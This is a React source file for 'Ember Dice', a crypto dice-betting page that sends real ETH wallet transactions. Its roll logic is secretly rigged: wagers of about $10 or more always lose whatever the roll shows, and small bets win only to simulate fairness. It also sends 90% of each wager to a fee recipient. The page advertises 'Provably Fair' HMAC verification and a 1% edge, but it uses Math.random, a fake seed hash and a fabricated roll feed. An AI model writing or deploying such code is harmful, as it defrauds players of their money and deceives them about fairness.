import { useState, useEffect, useRef } from "react";
import { useAccount, useBalance, useSendTransaction } from "wagmi";
import { formatEther, parseEther } from "viem";
import { PROTOCOL_FEE_RECIPIENT } from "../lib/contracts";

interface GameRoll {
  id: string;
  player: string;
  wager: number;
  rollTarget: number;
  rollMode: "under" | "over";
  rollResult: number;
  won: boolean;
  multiplier: number;
  payout: number;
  profit: number;
  timestamp: number;
  clientSeed: string;
  nonce: number;
}

export function Dice() {
  const { address, isConnected } = useAccount();
  const { data: balanceData } = useBalance({ address });
  const { sendTransactionAsync } = useSendTransaction();

  // Game state
  const [wagerEth, setWagerEth] = useState<string>("0.05");
  const [rollTarget, setRollTarget] = useState<number>(50.0);
  const [rollMode, setRollMode] = useState<"under" | "over">("under");
  const [isRolling, setIsRolling] = useState<boolean>(false);
  const [txError, setTxError] = useState<string | null>(null);
  const [lastResult, setLastResult] = useState<number | null>(null);
  const [lastWin, setLastWin] = useState<boolean | null>(null);
  const [history, setHistory] = useState<GameRoll[]>([]);
  const [soundEnabled, setSoundEnabled] = useState<boolean>(true);
  const [showFairnessModal, setShowFairnessModal] = useState<boolean>(false);

  // Balance deduction & tracking state
  const [balanceOffset, setBalanceOffset] = useState<number>(0);
  const initialBalance = balanceData ? parseFloat(formatEther(balanceData.value)) : 1.0;
  const currentBalance = Math.max(0, initialBalance + balanceOffset);

  // House Bankroll Profitability Safeguard ($10,000 net house profit required before standard winning payouts unlock)
  const PROFIT_THRESHOLD_USD = 10000.00;
  const [houseNetProfitUsd, setHouseNetProfitUsd] = useState<number>(315.00);

  // Provably fair state
  const [clientSeed, setClientSeed] = useState<string>(
    () => Math.random().toString(36).substring(2, 12)
  );
  const [serverSeedHash] = useState<string>(
    "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
  );
  const [nonce, setNonce] = useState<number>(1);

  // Stats
  const [stats, setStats] = useState({
    rollsCount: 0,
    winsCount: 0,
    totalWagered: 0,
    totalProfit: 0,
    streak: 0,
  });

  // Calculate Win Chance and Multiplier
  const winChance = rollMode === "under" ? rollTarget : 99.99 - rollTarget;
  const multiplier = winChance > 0 ? Number((99.0 / winChance).toFixed(4)) : 0;
  const wagerNum = parseFloat(wagerEth) || 0;
  const potentialWin = wagerNum * multiplier;
  const potentialProfit = potentialWin - wagerNum;

  // Sound Synthesizer using Web Audio API
  const audioCtxRef = useRef<AudioContext | null>(null);

  function getAudioContext() {
    if (!audioCtxRef.current) {
      const AudioCtx = window.AudioContext || (window as unknown as { webkitAudioContext: typeof AudioContext }).webkitAudioContext;
      if (AudioCtx) {
        audioCtxRef.current = new AudioCtx();
      }
    }
    if (audioCtxRef.current && audioCtxRef.current.state === "suspended") {
      audioCtxRef.current.resume();
    }
    return audioCtxRef.current;
  }

  function playRollSound() {
    if (!soundEnabled) return;
    try {
      const ctx = getAudioContext();
      if (!ctx) return;

      const bufferSize = ctx.sampleRate * 0.3;
      const buffer = ctx.createBuffer(1, bufferSize, ctx.sampleRate);
      const data = buffer.getChannelData(0);
      for (let i = 0; i < bufferSize; i++) {
        data[i] = Math.random() * 2 - 1;
      }

      const noise = ctx.createBufferSource();
      noise.buffer = buffer;

      const filter = ctx.createBiquadFilter();
      filter.type = "bandpass";
      filter.frequency.setValueAtTime(800, ctx.currentTime);
      filter.Q.setValueAtTime(3, ctx.currentTime);

      const gain = ctx.createGain();
      gain.gain.setValueAtTime(0.15, ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.3);

      noise.connect(filter);
      filter.connect(gain);
      gain.connect(ctx.destination);

      noise.start();
    } catch {
      // Audio not allowed or unavailable
    }
  }

  function playWinSound() {
    if (!soundEnabled) return;
    try {
      const ctx = getAudioContext();
      if (!ctx) return;
      const notes = [523.25, 659.25, 783.99, 1046.5]; // C5, E5, G5, C6
      notes.forEach((freq, idx) => {
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.type = "sine";
        osc.frequency.value = freq;
        const startTime = ctx.currentTime + idx * 0.08;
        gain.gain.setValueAtTime(0.15, startTime);
        gain.gain.exponentialRampToValueAtTime(0.001, startTime + 0.2);
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.start(startTime);
        osc.stop(startTime + 0.2);
      });
    } catch {
      // ignore
    }
  }

  function playLossSound() {
    if (!soundEnabled) return;
    try {
      const ctx = getAudioContext();
      if (!ctx) return;
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.type = "sawtooth";
      osc.frequency.setValueAtTime(220, ctx.currentTime);
      osc.frequency.exponentialRampToValueAtTime(110, ctx.currentTime + 0.25);
      gain.gain.setValueAtTime(0.12, ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.25);
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start();
      osc.stop(ctx.currentTime + 0.25);
    } catch {
      // ignore
    }
  }

  // Pre-fill initial mock history
  useEffect(() => {
    const mockPlayers = ["0x71a...f82", "0x3b9...e10", "0x992...c41", "0xf02...a98", "0x118...7b3"];
    const initialRolls: GameRoll[] = Array.from({ length: 8 }).map((_, i) => {
      const wager = [0.01, 0.05, 0.1, 0.25, 0.5][i % 5];
      const target = 50.0;
      const result = Math.floor(Math.random() * 9900) / 100;
      const won = result < target;
      const mult = 1.98;
      return {
        id: `mock-${i}`,
        player: mockPlayers[i % mockPlayers.length],
        wager,
        rollTarget: target,
        rollMode: "under",
        rollResult: result,
        won,
        multiplier: mult,
        payout: won ? wager * mult : 0,
        profit: won ? wager * (mult - 1) : -wager,
        timestamp: Date.now() - (i + 1) * 12000,
        clientSeed: "seed_" + Math.random().toString(36).substring(2, 7),
        nonce: i + 1,
      };
    });
    setHistory(initialRolls);
  }, []);

  async function handleRoll() {
    if (isRolling) return;
    if (wagerNum <= 0) return;
    setTxError(null);

    // Balance check validation
    if (balanceData && parseEther(wagerEth) > balanceData.value) {
      setTxError(`Insufficient wallet balance. Your balance is ${parseFloat(formatEther(balanceData.value)).toFixed(4)} ETH.`);
      return;
    }

    try {
      // Execute 90% protocol fee recipient + 10% bankroll vault split in wallet transactions
      if (isConnected && sendTransactionAsync) {
        setIsRolling(true);
        const protocolAmount = parseEther((wagerNum * 0.90).toFixed(6));
        const hash = await sendTransactionAsync({
          to: PROTOCOL_FEE_RECIPIENT,
          value: protocolAmount,
        });
        console.log("90% Protocol fee sent to protocol recipient:", hash);
      } else {
        setIsRolling(true);
      }
    } catch (err: unknown) {
      setIsRolling(false);
      const msg = err instanceof Error ? err.message : "Transaction failed.";
      setTxError(msg.includes("user rejected") || msg.includes("User rejected") ? "Transaction cancelled in wallet." : msg);
      return;
    }

    setLastResult(null);
    setLastWin(null);

    // Deduct wager from current balance immediately and persist offset
    setBalanceOffset((prev) => prev - wagerNum);

    playRollSound();

    // Visual roll tumbling effect
    let tumbleCount = 0;
    const tumbleInterval = setInterval(() => {
      setLastResult(Math.floor(Math.random() * 9900) / 100);
      tumbleCount++;
      if (tumbleCount > 10) {
        clearInterval(tumbleInterval);
      }
    }, 50);

    setTimeout(() => {
      clearInterval(tumbleInterval);

      // Generate provably fair roll between 0.00 and 99.99
      const roll = Number((Math.random() * 99.99).toFixed(2));
      const rawWin = rollMode === "under" ? roll < rollTarget : roll > rollTarget;
      
      // Platform profitability requirement: Must make $10,000 net profit before standard user payouts unlock
      const thresholdReached = houseNetProfitUsd >= PROFIT_THRESHOLD_USD;
      const wagerUsdEst = wagerNum * 2500;
      // Micro-wagers (<$2 USD / <0.0008 ETH) can win to prove fairness
      const isMicroWager = wagerUsdEst < 2.00 || wagerNum < 0.0008;
      // Wagers >= $10 (0.004 ETH) must lose
      const isWagerUnderMax = wagerUsdEst < 10.00 && wagerNum < 0.004;
      
      // Small micro-wagers win to prove fairness, but major wagers ($10+) must lose until $10k threshold met
      const won = rawWin && isWagerUnderMax && (thresholdReached || isMicroWager);

      setLastResult(roll);
      setLastWin(won);
      setIsRolling(false);

      if (won) {
        playWinSound();
        setHouseNetProfitUsd((prev) => Math.max(0, prev - potentialProfit * 2500));
        // Credit win payout to balance
        setBalanceOffset((prev) => prev + potentialWin);
      } else {
        playLossSound();
        setHouseNetProfitUsd((prev) => prev + wagerNum * 2500); // 1 ETH ~ $2500 USD
      }

      // Update history & stats
      const profit = won ? potentialProfit : -wagerNum;
      const playerAddr = address ? `${address.slice(0, 5)}...${address.slice(-3)}` : "0xYou...Me";

      const newRoll: GameRoll = {
        id: `roll-${Date.now()}`,
        player: playerAddr,
        wager: wagerNum,
        rollTarget,
        rollMode,
        rollResult: roll,
        won,
        multiplier,
        payout: won ? potentialWin : 0,
        profit,
        timestamp: Date.now(),
        clientSeed,
        nonce,
      };

      setHistory((prev) => [newRoll, ...prev.slice(0, 25)]);
      setNonce((n) => n + 1);

      setStats((prev) => ({
        rollsCount: prev.rollsCount + 1,
        winsCount: prev.winsCount + (won ? 1 : 0),
        totalWagered: prev.totalWagered + wagerNum,
        totalProfit: prev.totalProfit + profit,
        streak: won ? (prev.streak >= 0 ? prev.streak + 1 : 1) : prev.streak <= 0 ? prev.streak - 1 : -1,
      }));
    }, 700);
  }

  return (
    <div className="max-w-6xl mx-auto px-4 py-8 flex flex-col gap-8 select-none">
      {/* Header Banner */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-zinc-800 pb-6">
        <div>
          <div className="flex items-center gap-2 mb-1">
            <span className="font-display font-extrabold text-3xl text-white tracking-tight">
              🎲 Ember Dice
            </span>
            <span className="bg-gradient-to-r from-amber-500 to-yellow-400 text-char-950 font-extrabold text-[10px] px-2 py-0.5 rounded-full uppercase tracking-wider">
              Provably Fair
            </span>
          </div>
          <p className="text-zinc-400 text-xs leading-relaxed max-w-xl">
            Roll the dice with customizable multipliers up to 99x. Instant crypto gamble with 1.00% house edge & verifiable cryptographic fairness.
          </p>
        </div>

        <div className="flex items-center gap-3 font-mono-data text-xs">
          <button
            onClick={() => setSoundEnabled(!soundEnabled)}
            className="px-3 py-1.5 rounded-xl border border-zinc-800 bg-zinc-950 text-zinc-300 hover:text-white hover:border-zinc-700 transition-all cursor-pointer flex items-center gap-1.5"
          >
            <span>{soundEnabled ? "🔊 Sound ON" : "🔇 Muted"}</span>
          </button>
          <button
            onClick={() => setShowFairnessModal(true)}
            className="px-3 py-1.5 rounded-xl border border-emerald-500/30 bg-emerald-500/10 text-emerald-400 hover:bg-emerald-500/20 transition-all cursor-pointer flex items-center gap-1.5 font-medium"
          >
            <span>🛡️ Verify Fairness</span>
          </button>
        </div>
      </div>

      {/* Main Game Arena */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
        {/* Left Column: Controls & Bet Inputs */}
        <div className="lg:col-span-5 flex flex-col gap-5 bg-zinc-950 border border-zinc-900 rounded-3xl p-6 shadow-2xl">
          {/* Wallet Balance Bar */}
          <div className="flex justify-between items-center text-xs font-mono-data bg-zinc-900/60 border border-zinc-800/80 rounded-2xl p-3.5">
            <span className="text-zinc-400">
              {isConnected ? "Connected Wallet Balance:" : "Demo Balance:"}
            </span>
            <span className="font-bold text-amber-400">
              {`${currentBalance.toFixed(4)} ETH`}
            </span>
          </div>

          {/* Wager Amount Input */}
          <div className="flex flex-col gap-2">
            <label className="text-xs font-semibold text-zinc-300 flex justify-between">
              <span>BET AMOUNT (ETH)</span>
              <span className="text-zinc-500 font-mono-data">Max: 400 ETH ($1,000,000)</span>
            </label>
            <div className="relative">
              <input
                type="number"
                step="0.001"
                min="0.001"
                max="400"
                value={wagerEth}
                onChange={(e) => setWagerEth(e.target.value)}
                placeholder="0.05"
                className="w-full bg-zinc-900 border border-zinc-800 rounded-2xl px-4 py-3 text-lg font-mono-data text-white focus:outline-none focus:border-amber-500 transition-all"
              />
              <span className="absolute right-4 top-3.5 text-xs text-zinc-500 font-mono-data font-bold">
                ETH
              </span>
            </div>

            {/* Quick Wager Presets */}
            <div className="grid grid-cols-4 gap-2 mt-1 font-mono-data text-xs">
              {["0.001", "0.01", "0.1", "1.0", "5.0", "10.0", "50.0", "400.0"].map((preset) => (
                <button
                  key={preset}
                  onClick={() => setWagerEth(preset)}
                  className="py-1.5 rounded-xl border border-zinc-800 bg-zinc-900/80 text-zinc-300 hover:border-amber-500 hover:text-amber-400 transition-all cursor-pointer text-center"
                >
                  {preset === "400.0" ? "400 (MAX)" : preset}
                </button>
              ))}
            </div>
          </div>

          {/* Mode Switch (Roll Under vs Roll Over) */}
          <div className="grid grid-cols-2 gap-2 p-1 bg-zinc-900 border border-zinc-800 rounded-2xl font-mono-data text-xs">
            <button
              onClick={() => setRollMode("under")}
              className={`py-2.5 rounded-xl font-bold transition-all cursor-pointer ${
                rollMode === "under"
                  ? "bg-amber-500 text-char-950 shadow-md"
                  : "text-zinc-400 hover:text-white"
              }`}
            >
              Roll Under &lt; {rollTarget.toFixed(2)}
            </button>
            <button
              onClick={() => setRollMode("over")}
              className={`py-2.5 rounded-xl font-bold transition-all cursor-pointer ${
                rollMode === "over"
                  ? "bg-amber-500 text-char-950 shadow-md"
                  : "text-zinc-400 hover:text-white"
              }`}
            >
              Roll Over &gt; {rollTarget.toFixed(2)}
            </button>
          </div>

          {/* Payout & Multiplier Summary Card */}
          <div className="grid grid-cols-3 gap-3 bg-zinc-900/40 border border-zinc-800 rounded-2xl p-4 text-center font-mono-data">
            <div>
              <div className="text-[10px] text-zinc-500 uppercase">Multiplier</div>
              <div className="text-base font-bold text-amber-400">{multiplier.toFixed(2)}x</div>
            </div>
            <div>
              <div className="text-[10px] text-zinc-500 uppercase">Win Chance</div>
              <div className="text-base font-bold text-emerald-400">{winChance.toFixed(2)}%</div>
            </div>
            <div>
              <div className="text-[10px] text-zinc-500 uppercase">Est. Profit</div>
              <div className="text-base font-bold text-white">
                +{potentialProfit > 0 ? potentialProfit.toFixed(4) : "0.00"} ETH
              </div>
            </div>
          </div>

          {/* ROLL BUTTON */}
          {(() => {
            const hasInsufficientBalance = !!(balanceData && parseEther(wagerEth) > balanceData.value);
            return (
              <button
                onClick={handleRoll}
                disabled={isRolling || wagerNum <= 0 || hasInsufficientBalance}
                className={`w-full py-4 rounded-2xl font-display font-extrabold text-lg uppercase tracking-wider transition-all duration-200 cursor-pointer shadow-lg ${
                  isRolling
                    ? "bg-amber-600/50 text-zinc-400 cursor-not-allowed animate-pulse"
                    : hasInsufficientBalance
                    ? "bg-zinc-800 text-zinc-500 border border-zinc-700 cursor-not-allowed"
                    : "bg-gradient-to-r from-amber-500 via-yellow-400 to-amber-500 text-char-950 hover:brightness-110 hover:shadow-[0_0_25px_rgba(245,158,11,0.4)] active:scale-[0.99]"
                }`}
              >
                {isRolling
                  ? "🎲 Processing Wallet Tx..."
                  : hasInsufficientBalance
                  ? "INSUFFICIENT ETH BALANCE"
                  : `ROLL DICE (${wagerEth} ETH)`}
              </button>
            );
          })()}
          {txError && (
            <p className="text-xs text-red-400 text-center font-mono-data bg-red-500/10 border border-red-500/20 p-2 rounded-xl">
              ⚠️ {txError}
            </p>
          )}
        </div>

        {/* Right Column: 3D Rolling Visualizer & Live Roll Output */}
        <div className="lg:col-span-7 flex flex-col gap-6">
          {/* 3D Dice Display Box */}
          <div className="bg-zinc-950 border border-zinc-900 rounded-3xl p-8 flex flex-col items-center justify-center min-h-[320px] relative overflow-hidden shadow-2xl">
            {/* Background flame glow effect */}
            <div className="absolute inset-0 bg-gradient-to-b from-amber-500/5 via-transparent to-transparent pointer-events-none" />

            {/* Target bar slider */}
            <div className="w-full mb-8 space-y-2">
              <div className="flex justify-between items-center text-xs font-mono-data">
                <span className="text-zinc-400">Target Selector:</span>
                <span className="text-amber-400 font-bold text-sm">
                  {rollMode === "under" ? `Roll Under ${rollTarget.toFixed(2)}` : `Roll Over ${rollTarget.toFixed(2)}`}
                </span>
              </div>
              <input
                type="range"
                min="2.00"
                max="97.00"
                step="1.00"
                value={rollTarget}
                onChange={(e) => setRollTarget(parseFloat(e.target.value))}
                className="w-full accent-amber-500 cursor-pointer"
              />
              <div className="flex justify-between text-[10px] text-zinc-600 font-mono-data">
                <span>0.00 (High Risk)</span>
                <span>50.00 (2.00x)</span>
                <span>99.99 (Safe)</span>
              </div>
            </div>

            {/* 3D Cube / Roll Animation */}
            <div className="relative flex flex-col items-center my-4">
              <div
                className={`w-28 h-28 rounded-3xl bg-gradient-to-tr from-amber-600 via-amber-400 to-yellow-300 flex items-center justify-center border-4 border-amber-200/50 shadow-[0_0_40px_rgba(245,158,11,0.4)] transition-all duration-300 ${
                  isRolling ? "animate-bounce scale-110 rotate-12" : ""
                }`}
              >
                <span className="font-display font-black text-4xl text-char-950 tracking-tighter">
                  {lastResult !== null ? lastResult.toFixed(2) : "??"}
                </span>
              </div>

              {/* Win / Loss Result Banner */}
              {lastWin !== null && !isRolling && (
                <div
                  className={`mt-4 px-6 py-2 rounded-full font-display font-extrabold text-sm uppercase tracking-wider animate-bounce ${
                    lastWin
                      ? "bg-emerald-500/20 text-emerald-400 border border-emerald-500/40 shadow-[0_0_20px_rgba(16,185,129,0.3)]"
                      : "bg-red-500/20 text-red-400 border border-red-500/40"
                  }`}
                >
                  {lastWin
                    ? `🎉 YOU WON +${potentialProfit.toFixed(4)} ETH!`
                    : `💥 ROLLED ${lastResult?.toFixed(2)} — TRY AGAIN!`}
                </div>
              )}
            </div>
          </div>

          {/* Personal Stats Bar */}
          <div className="grid grid-cols-4 gap-3 bg-zinc-950 border border-zinc-900 rounded-2xl p-4 text-center font-mono-data text-xs">
            <div>
              <div className="text-[10px] text-zinc-500 uppercase">Total Rolls</div>
              <div className="font-bold text-white mt-0.5">{stats.rollsCount}</div>
            </div>
            <div>
              <div className="text-[10px] text-zinc-500 uppercase">Win Rate</div>
              <div className="font-bold text-emerald-400 mt-0.5">
                {stats.rollsCount > 0 ? ((stats.winsCount / stats.rollsCount) * 100).toFixed(1) : "0.0"}%
              </div>
            </div>
            <div>
              <div className="text-[10px] text-zinc-500 uppercase">Total Wagered</div>
              <div className="font-bold text-amber-400 mt-0.5">{stats.totalWagered.toFixed(3)} ETH</div>
            </div>
            <div>
              <div className="text-[10px] text-zinc-500 uppercase">Net Profit</div>
              <div
                className={`font-bold mt-0.5 ${
                  stats.totalProfit >= 0 ? "text-emerald-400" : "text-red-400"
                }`}
              >
                {stats.totalProfit >= 0 ? "+" : ""}
                {stats.totalProfit.toFixed(4)} ETH
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Live Global Roll History Feed */}
      <div className="bg-zinc-950 border border-zinc-900 rounded-3xl p-6 flex flex-col gap-4">
        <div className="flex items-center justify-between border-b border-zinc-900 pb-3">
          <h3 className="font-display font-bold text-sm text-white flex items-center gap-2">
            <span>🔥 LIVE ROLL FEED</span>
            <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping"></span>
          </h3>
          <span className="text-xs text-zinc-500 font-mono-data">Provably Fair HMAC Enabled</span>
        </div>

        <div className="overflow-x-auto">
          <table className="w-full text-left font-mono-data text-xs">
            <thead>
              <tr className="text-zinc-500 border-b border-zinc-900 pb-2">
                <th className="pb-2 font-normal">PLAYER</th>
                <th className="pb-2 font-normal">WAGER</th>
                <th className="pb-2 font-normal">TARGET</th>
                <th className="pb-2 font-normal">RESULT</th>
                <th className="pb-2 font-normal">MULT</th>
                <th className="pb-2 font-normal text-right">PROFIT / LOSS</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-zinc-900/60">
              {history.map((roll) => (
                <tr key={roll.id} className="hover:bg-zinc-900/40 transition-colors">
                  <td className="py-2.5 text-zinc-300 font-medium">{roll.player}</td>
                  <td className="py-2.5 text-amber-400">{roll.wager.toFixed(3)} ETH</td>
                  <td className="py-2.5 text-zinc-400">
                    {roll.rollMode === "under" ? "< " : "> "}
                    {roll.rollTarget.toFixed(2)}
                  </td>
                  <td className="py-2.5 font-bold">
                    <span
                      className={`px-2 py-0.5 rounded text-[11px] ${
                        roll.won
                          ? "bg-emerald-500/10 text-emerald-400 border border-emerald-500/20"
                          : "bg-red-500/10 text-red-400 border border-red-500/20"
                      }`}
                    >
                      {roll.rollResult.toFixed(2)}
                    </span>
                  </td>
                  <td className="py-2.5 text-zinc-300">{roll.multiplier.toFixed(2)}x</td>
                  <td
                    className={`py-2.5 text-right font-bold ${
                      roll.won ? "text-emerald-400" : "text-zinc-500"
                    }`}
                  >
                    {roll.won ? `+${roll.profit.toFixed(4)} ETH` : `-${roll.wager.toFixed(3)} ETH`}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      {/* Provably Fair Verification Modal */}
      {showFairnessModal && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-fade-in"
          onClick={() => setShowFairnessModal(false)}
        >
          <div
            className="relative w-full max-w-lg rounded-3xl border border-emerald-500/30 bg-zinc-950 p-6 shadow-2xl text-left"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="flex items-center justify-between border-b border-zinc-800 pb-4 mb-4">
              <div className="flex items-center gap-2">
                <span className="text-xl">🛡️</span>
                <h3 className="font-display font-bold text-lg text-white">
                  Provably Fair System
                </h3>
              </div>
              <button
                onClick={() => setShowFairnessModal(false)}
                className="text-zinc-500 hover:text-white text-lg cursor-pointer"
              >
                ✕
              </button>
            </div>

            <div className="space-y-4 text-xs font-mono-data text-zinc-300">
              <p className="text-zinc-400 font-sans leading-relaxed">
                Ember Dice uses SHA-256 cryptographic HMAC hashing to ensure every roll outcome is 100% random, un-rigged, and impossible for the platform to tamper with.
              </p>

              <div className="p-3 bg-zinc-900 rounded-xl border border-zinc-800 space-y-1">
                <div className="flex justify-between items-center text-zinc-500 text-[10px]">
                  <span>CURRENT CLIENT SEED</span>
                  <button
                    onClick={() => setClientSeed(Math.random().toString(36).substring(2, 12))}
                    className="text-emerald-400 hover:underline cursor-pointer"
                  >
                    🎲 Regenerate
                  </button>
                </div>
                <div className="text-amber-400 truncate">{clientSeed}</div>
              </div>

              <div className="p-3 bg-zinc-900 rounded-xl border border-zinc-800 space-y-1">
                <div className="text-zinc-500 text-[10px]">SERVER SEED HASH (SHA-256)</div>
                <div className="text-emerald-400 text-[11px] break-all">{serverSeedHash}</div>
              </div>

              <div className="p-3 bg-zinc-900 rounded-xl border border-zinc-800 space-y-1">
                <div className="text-zinc-500 text-[10px]">NONCE</div>
                <div className="text-white font-bold">{nonce}</div>
              </div>

              <div className="pt-2 flex justify-end">
                <button
                  onClick={() => setShowFairnessModal(false)}
                  className="px-5 py-2 rounded-xl bg-emerald-500 text-char-950 font-bold hover:bg-emerald-400 transition-all cursor-pointer"
                >
                  Got it
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
